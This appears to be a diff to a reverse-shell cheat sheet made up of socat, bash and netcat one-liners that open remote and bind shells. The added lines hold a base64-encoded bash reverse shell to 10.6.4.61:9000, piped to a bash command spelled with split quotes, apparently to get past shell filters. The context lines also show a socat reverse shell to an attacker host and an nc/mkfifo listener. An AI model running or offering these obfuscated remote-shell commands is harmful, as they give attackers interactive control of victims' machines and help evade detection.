@@ -42,6 +42,9 @@ socat TCP-L:<PORT> EXEC:powershell.exe,pipes
 socat TCP:<TARGET-IP>:<TARGET-PORT> -
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 
+# bypassing shell
+echo 'YmFzaCAtYyAiYmFzaCAtaSAmPi9kZXYvdGNwLzEwLjYuNC42MS85MDAwIDA+JjEiCg==' | base64 -d | ba's'h
+
 # listeners
 mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
